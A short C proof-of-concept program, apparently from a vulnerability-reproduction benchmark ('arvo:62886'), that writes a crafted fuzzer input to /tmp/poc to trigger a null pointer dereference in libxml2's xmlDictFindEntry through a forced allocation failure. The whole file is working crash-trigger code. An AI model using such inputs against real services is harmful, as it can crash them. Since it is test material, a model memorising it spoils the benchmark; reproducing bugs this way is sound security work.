#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for arvo:62886 */
/* Triggers: null pointer dereference in xmlDictFindEntry */
/* Vuln class: null_pointer_dereference */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write maxAlloc = 100 (big-endian) - allows dict struct, fails table allocation */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x64, f);

    /* Write XPath expression: "a:*" followed by backslash-newline */
    fputc('a', f);
    fputc(':', f);
    fputc('*', f);
    fputc(0x5C, f);
    fputc(0x0A, f);

    /* Write XML document with namespace to trigger dict lookup */
    fprintf(f, "<?xml version=\"1.0\"?>");
    fprintf(f, "<doc xmlns:a=\"http://ns\">");
    fprintf(f, "<a:child/>");
    fprintf(f, "</doc>");

    /* Write backslash-newline terminator */
    fputc(0x5C, f);
    fputc(0x0A, f);

    fclose(f);
    return 0;
}